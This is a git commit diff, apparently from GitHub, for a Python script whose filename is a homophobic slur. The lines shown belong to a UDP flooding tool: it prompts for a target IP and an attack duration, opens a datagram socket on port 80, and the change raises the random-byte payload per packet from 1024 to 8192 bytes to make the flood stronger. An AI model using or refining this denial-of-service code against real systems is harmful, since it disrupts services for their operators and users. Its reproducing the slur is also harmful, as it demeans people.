50cd60373ee0a72efdf4e9b68ee2bc14f21f41b8
Jurrikah <52750167+Jurrikah@users.noreply.github.com>
2020-02-04 04:01:28 +1000

    Add files via upload

--- gaybitch.py
+++ gaybitch.py
@@ -8,7 +8,7 @@ os.system("cls")
 port = 80
 ip = input("\nEnter IP: ")
 dur = int(input("\nEnter duration of attack: "))
-bytes = os.urandom(1024)
+bytes = os.urandom(8192)
 socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 sent = int(0)
 timeout = time.time()+dur
